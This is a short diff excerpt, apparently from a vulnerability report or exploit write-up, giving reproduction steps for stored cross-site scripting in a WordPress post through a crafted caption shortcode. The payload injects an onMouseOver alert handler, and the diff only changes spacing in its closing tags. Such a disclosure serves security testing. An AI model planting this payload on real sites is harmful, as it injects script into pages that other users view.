@@ -67,7 +67,7 @@ Steps:
 2. Enter the following code in a WP post:
 
 
-TEST!!![caption width="1" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(1)'"> Click me </a>
+TEST!!![caption width="1" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(1)'" > Click me < /a >
 
 
 3. View post to get XSS.
